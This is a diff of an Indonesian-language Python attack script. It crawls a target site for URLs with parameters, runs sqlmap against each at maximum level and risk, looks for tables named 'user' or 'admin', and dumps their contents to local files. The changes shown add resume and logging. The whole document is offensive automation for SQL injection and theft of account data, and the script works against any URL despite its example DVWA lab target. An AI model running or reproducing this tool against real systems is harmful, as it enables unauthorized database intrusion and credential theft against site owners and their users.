@@ -3,6 +3,7 @@ from urllib.parse import urljoin, urlparse
 from bs4 import BeautifulSoup
 import subprocess
 import re
+import os
 from concurrent.futures import ThreadPoolExecutor, as_completed
 
 CRAWL_LIMIT = 100
@@ -12,8 +13,9 @@ SQLMAP_PATH = "sqlmap"
 VISITED = set()
 URLS_WITH_PARAMS = []
 
+os.makedirs("hasil_dump", exist_ok=True)
+
 def crawl(url, target_domain):
-    """Crawl halaman dan ambil URL dengan parameter GET"""
     if len(VISITED) >= CRAWL_LIMIT or url in VISITED:
         return
     try:
@@ -28,20 +30,33 @@ def crawl(url, target_domain):
         link = urljoin(url, a["href"])
         parsed = urlparse(link)
         if target_domain in link and link not in VISITED:
-            if parsed.query:  # Ada parameter
+            if parsed.query:
                 URLS_WITH_PARAMS.append(link)
             crawl(link, target_domain)
 
 def run_sqlmap(cmd):
-    """Jalankan perintah SQLMap"""
+    cmd.extend(["--resume"])
     return subprocess.run(cmd, capture_output=True, text=True).stdout
 
+def save_log(target, db, table, data):
+    safe_target = target.replace("http://", "").replace("https://", "").replace("/", "_")
+    filename = f"hasil_dump/{safe_target}_{db}_{table}.txt"
+    with open(filename, "w", encoding="utf-8") as f:
+        f.write(data)
+    print(f"[+] Hasil dump tersimpan di {filename}")
+
 def test_sqlmap(url):
-    """Tes kerentanan SQLi dan cari tabel user/admin"""
+    if url in tested_urls:
+        print(f"[SKIP] {url} sudah diuji sebelumnya.")
+        return
+
     print(f"\n[+] Menguji: {url}")
     output = run_sqlmap([
         SQLMAP_PATH, "-u", url, "--batch", "--level=5", "--risk=3", "--random-agent"
     ])
+
+    tested_urls.add(url)
+    save_tested_urls()
 
     if re.search(r"the back-end DBMS", output, re.IGNORECASE):
         print(f"[!!!] Rentan SQLi: {url}")
@@ -50,7 +65,6 @@ def test_sqlmap(url):
         print(f"[-] Tidak rentan: {url}")
 
 def find_user_admin_tables(url):
-    """Cari tabel yang mengandung 'user' atau 'admin'"""
     db_list = run_sqlmap([SQLMAP_PATH, "-u", url, "--batch", "--level=5", "--risk=3", "--dbs"])
     databases = re.findall(r"[*]\s+(\w+)", db_list)
 
@@ -60,9 +74,32 @@ def find_user_admin_tables(url):
         for table in tables:
             if "user" in table.lower() or "admin" in table.lower():
                 print(f"[+] Tabel target ditemukan: {db}.{table}")
-                run_sqlmap([
+                dump_out = run_sqlmap([
                     SQLMAP_PATH, "-u", url, "--batch", "--level=5", "--risk=3", "-D", db, "-T", table, "--dump"
                 ])
+                save_log(url, db, table, dump_out)
+
+def save_urls_found():
+    with open("urls_found.txt", "w", encoding="utf-8") as f:
+        for url in URLS_WITH_PARAMS:
+            f.write(url + "\n")
+
+def load_urls_found():
+    if os.path.exists("urls_found.txt"):
+        with open("urls_found.txt", "r", encoding="utf-8") as f:
+            return [line.strip() for line in f if line.strip()]
+    return []
+
+def save_tested_urls():
+    with open("tested_urls.txt", "w", encoding="utf-8") as f:
+        for url in tested_urls:
+            f.write(url + "\n")
+
+def load_tested_urls():
+    if os.path.exists("tested_urls.txt"):
+        with open("tested_urls.txt", "r", encoding="utf-8") as f:
+            return set(line.strip() for line in f if line.strip())
+    return set()
 
 if __name__ == "__main__":
     TARGET = input("Masukkan URL target (contoh: http://localhost/dvwa/): ").strip()
@@ -72,8 +109,15 @@ if __name__ == "__main__":
 
     TARGET_DOMAIN = urlparse(TARGET).netloc
 
-    print("[*] Mulai crawling...")
-    crawl(TARGET, TARGET_DOMAIN)
+    URLS_WITH_PARAMS = load_urls_found()
+    tested_urls = load_tested_urls()
+
+    if URLS_WITH_PARAMS:
+        print(f"[Resume] Memuat {len(URLS_WITH_PARAMS)} URL dari urls_found.txt")
+    else:
+        print("[*] Mulai crawling...")
+        crawl(TARGET, TARGET_DOMAIN)
+        save_urls_found()
 
     print(f"\n[!] Total URL dengan parameter ditemukan: {len(URLS_WITH_PARAMS)}")
     with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
